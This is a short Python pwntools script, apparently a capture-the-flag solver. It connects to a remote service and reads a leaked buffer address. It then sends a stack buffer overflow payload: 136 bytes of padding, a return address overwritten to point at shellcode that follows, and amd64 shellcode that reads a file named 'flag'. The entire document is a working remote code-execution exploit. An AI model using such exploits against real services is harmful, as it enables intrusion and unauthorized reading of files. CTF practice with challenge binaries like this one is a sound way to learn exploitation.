#!/usr/bin/env python2.7

import argparse

from pwn import *

def main(args):
    # connect to remote service
    conn = remote(args.host, args.port)

    # read the helpful message telling us where our payload will land
    buf= int(conn.readline().split(":")[1].strip(),16)

    # manually recovered locally with disassembly 
    # e.g. gets to `-0x80(%rbp)`, 0x80 = 128, +8 for saved ebp = 136 to saved return
    pad = 136

    payload = b"A"*pad
    payload += p64(buf+pad+8) # clobber return to ret to shellcode immediately following
    payload += asm(pwnlib.shellcraft.amd64.linux.cat('flag'), arch='amd64', os='linux')
    payload += "\n"

    conn.send(payload)
    conn.readline() # discard echo
    print("flag: {}".format(conn.readline().strip()))

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='solve')
    parser.add_argument('host')
    parser.add_argument('port', type=int)

    args = parser.parse_args()
    main(args)
